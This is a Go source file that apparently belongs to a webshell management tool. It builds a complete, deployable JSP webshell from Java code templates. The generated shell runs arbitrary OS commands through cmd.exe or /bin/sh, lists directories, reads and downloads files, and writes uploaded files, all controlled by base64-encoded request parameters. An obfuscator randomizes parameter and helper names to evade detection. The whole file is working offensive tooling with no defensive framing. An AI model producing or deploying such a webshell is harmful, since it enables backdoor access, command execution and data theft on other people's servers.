// Package jsp provides Java code templates for JSP shell operations,
// equivalent to adapter/php/renderer.go for PHP.
//
// Each template method returns the Java code fragment for one operation.
// ShellSource() composes them into a complete deployable JSP shell.
package jsp

import (
	"crypto/rand"
	"encoding/hex"
	"fmt"
)

// JSPTemplates contains Java code templates for all shell operations.
// Usage mirrors PHPTemplates in the PHP adapter.
type JSPTemplates struct{}

// NewJSPTemplates builds a JSPTemplates instance.
func NewJSPTemplates() *JSPTemplates { return &JSPTemplates{} }

func randomVar6() string {
	buf := make([]byte, 3)
	_, _ = rand.Read(buf)
	return hex.EncodeToString(buf)
}

func randomHex(n int) string {
	buf := make([]byte, (n+1)/2)
	_, _ = rand.Read(buf)
	out := hex.EncodeToString(buf)
	if len(out) > n {
		out = out[:n]
	}
	return out
}

// action codes (defaults --overridden by Obfuscator)
const (
	actionInfo     = "i"
	actionExec     = "e"
	actionFileList = "l"
	actionFileRead = "r"
	actionFileDown = "d"
	actionFileUp   = "u"
)

//        Per-operation template methods
// Each returns the Java code fragment for that operation, using
// default helper names b()/e() and default param names z1/z2.
// For obfuscated shells, ShellSourceWith() substitutes the names.

// Info returns the Java code for the Info operation.
func (t *JSPTemplates) Info() string {
	return "try{" +
		"String wd=new java.io.File(\".\").getCanonicalPath();" +
		"String os=System.getProperty(\"os.name\")+\" \"+System.getProperty(\"os.version\");" +
		"String us=System.getProperty(\"user.name\");" +
		"out.print(e(wd)+\"\\t\"+e(os)+\"\\t\"+e(us));" +
		"}catch(Exception ex){out.print(\"ERR:INFO:\"+ex.getMessage());}"
}

// Exec returns the Java code for the Exec operation.
func (t *JSPTemplates) Exec() string {
	return "try{" +
		"String cmd=b(request.getParameter(\"z1\"));" +
		"String osName=System.getProperty(\"os.name\").toLowerCase();" +
		"String[] execCmd;" +
		"if(osName.contains(\"win\")){" +
		"execCmd=new String[]{\"cmd.exe\",\"/c\",cmd};" +
		"}else{" +
		"execCmd=new String[]{\"/bin/sh\",\"-c\",cmd};" +
		"}" +
		"Process p=Runtime.getRuntime().exec(execCmd);" +
		"BufferedReader br=new BufferedReader(new InputStreamReader(p.getInputStream(),\"UTF-8\"));" +
		"String line;boolean first=true;" +
		"while((line=br.readLine())!=null){" +
		"if(first){out.print(line);first=false;}else{out.println();out.print(line);}" +
		"}" +
		"try{br.close();}catch(Exception ex){}" +
		"int ec=p.waitFor();" +
		"out.print(\"ret=\"+ec);" +
		"}catch(Exception ex){out.print(\"ret=127\");}"
}

// FileList returns the Java code for the FileList operation.
func (t *JSPTemplates) FileList() string {
	return "try{" +
		"String path=b(request.getParameter(\"z1\"));" +
		"File dir=new File(path);" +
		"File[] files=dir.listFiles();" +
		"if(files!=null){" +
		"SimpleDateFormat sdf=new SimpleDateFormat(\"yyyy-MM-dd HH:mm:ss\");" +
		"for(File f:files){" +
		"String fName=f.getName();" +
		"if(f.isDirectory())fName+=\"/\";" +
		"out.print(fName+\"\\t\");" +
		"out.print(sdf.format(new java.util.Date(f.lastModified()))+\"\\t\");" +
		"out.print(f.length()+\"\\t\");" +
		"out.print(f.isDirectory()?\"0755\":\"0644\");" +
		"out.println();" +
		"}" +
		"}" +
		"}catch(Exception ex){out.print(\"ERR:LIST:\"+ex.getMessage());}"
}

// FileRead returns the Java code for the FileRead operation.
func (t *JSPTemplates) FileRead() string {
	return "try{" +
		"String path=b(request.getParameter(\"z1\"));" +
		"FileInputStream fis=new FileInputStream(path);" +
		"ByteArrayOutputStream bos=new ByteArrayOutputStream();" +
		"byte[] buf=new byte[8192];int n;" +
		"while((n=fis.read(buf))!=-1)bos.write(buf,0,n);" +
		"fis.close();" +
		"String raw=new String(bos.toByteArray(),\"ISO-8859-1\");" +
		"out.print(e(raw));" +
		"}catch(Exception ex){out.print(\"ERR:READ:\"+ex.getMessage());}"
}

// FileDownload returns the Java code for the FileDownload operation.
func (t *JSPTemplates) FileDownload() string {
	return "try{" +
		"String path=b(request.getParameter(\"z1\"));" +
		"FileInputStream fis=new FileInputStream(path);" +
		"ByteArrayOutputStream bos=new ByteArrayOutputStream();" +
		"byte[] buf=new byte[8192];int n;" +
		"while((n=fis.read(buf))!=-1)bos.write(buf,0,n);" +
		"fis.close();" +
		"String raw=new String(bos.toByteArray(),\"ISO-8859-1\");" +
		"out.print(e(raw));" +
		"}catch(Exception ex){out.print(\"ERR:DOWNLOAD:\"+ex.getMessage());}"
}

// FileUpload returns the Java code for the FileUpload operation.
func (t *JSPTemplates) FileUpload() string {
	return "try{" +
		"String path=b(request.getParameter(\"z1\"));" +
		"String content=b(request.getParameter(\"z2\"));" +
		"FileOutputStream fos=new FileOutputStream(path);" +
		"fos.write(content.getBytes(\"ISO-8859-1\"));" +
		"fos.close();" +
		"out.print(\"1\");" +
		"}catch(Exception ex){out.print(\"0:\"+ex.getMessage());}"
}

//        Shell composition helpers

// HelperBase64 returns base64 helper Java method code using default names.
func HelperBase64() string {
	return HelperBase64With(DefaultObfuscator())
}

// HelperBase64With returns base64 helper Java method code with custom names.
func HelperBase64With(obf *Obfuscator) string {
	dn := obf.HelperDecode()
	en := obf.HelperEncode()
	return fmt.Sprintf(
		"String %s(String s){try{return new String(java.util.Base64.getDecoder().decode(s),\"UTF-8\");}catch(Exception ex){return \"\";}}"+
			"String %s(String s){try{return java.util.Base64.getEncoder().encodeToString(s.getBytes(\"UTF-8\"));}catch(Exception ex){return \"\";}}",
		dn, en,
	)
}

// ShellSource returns the complete deployable JSP shell with default obfuscation.
func ShellSource() string {
	return ShellSourceWith(DefaultObfuscator())
}

// ShellSourceWith returns the complete deployable JSP shell using a custom Obfuscator.
func ShellSourceWith(obf *Obfuscator) string {
	t := &JSPTemplates{}
	bd := obf.HelperDecode()
	be := obf.HelperEncode()
	af := obf.ActionField()
	p1 := obf.Param1()
	p2 := obf.Param2()
	acInfo := obf.ActionCode("info")
	acExec := obf.ActionCode("exec")
	acList := obf.ActionCode("file.list")
	acRead := obf.ActionCode("file.read")
	acDown := obf.ActionCode("file.download")
	acUp := obf.ActionCode("file.upload")

	// Use per-operation templates and substitute obfuscated names
	infoCode := templateSubst(t.Info(), "b", bd, "e", be, "z1", p1, "z2", p2)
	execCode := templateSubst(t.Exec(), "b", bd, "e", be, "z1", p1, "z2", p2)
	listCode := templateSubst(t.FileList(), "b", bd, "e", be, "z1", p1, "z2", p2)
	readCode := templateSubst(t.FileRead(), "b", bd, "e", be, "z1", p1, "z2", p2)
	downCode := templateSubst(t.FileDownload(), "b", bd, "e", be, "z1", p1, "z2", p2)
	upCode := templateSubst(t.FileUpload(), "b", bd, "e", be, "z1", p1, "z2", p2)

	return `<%@page import="java.io.*,java.util.*,java.text.*"%>` + "\n" +
		`<%!` + HelperBase64With(obf) + `%>` + "\n" +
		`<%
String z0=request.getParameter("` + af + `");
if("` + acInfo + `".equals(z0)){` + infoCode + `
}else if("` + acExec + `".equals(z0)){` + execCode + `
}else if("` + acList + `".equals(z0)){` + listCode + `
}else if("` + acRead + `".equals(z0)){` + readCode + `
}else if("` + acDown + `".equals(z0)){` + downCode + `
}else if("` + acUp + `".equals(z0)){` + upCode + `
}
%>`
}

// templateSubst replaces helper and param names in Java code fragments.
func templateSubst(code, oldB, newB, oldE, newE, oldZ1, newZ1, oldZ2, newZ2 string) string {
	out := code
	// Replace helper function names
	out = replaceAll(out, oldB+"(", newB+"(")
	out = replaceAll(out, oldE+"(", newE+"(")
	// Replace param names in getParameter calls
	out = replaceAll(out, `getParameter("`+oldZ1+`")`, `getParameter("`+newZ1+`")`)
	out = replaceAll(out, `getParameter("`+oldZ2+`")`, `getParameter("`+newZ2+`")`)
	return out
}

func replaceAll(s, old, new string) string {
	if old == "" {
		return s
	}
	var out string
	for {
		idx := indexOf(s, old)
		if idx < 0 {
			return out + s
		}
		out += s[:idx] + new
		s = s[idx+len(old):]
	}
}

func indexOf(s, sub string) int {
	if sub == "" {
		return 0
	}
	for i := 0; i+len(sub) <= len(s); i++ {
		if s[i:i+len(sub)] == sub {
			return i
		}
	}
	return -1
}
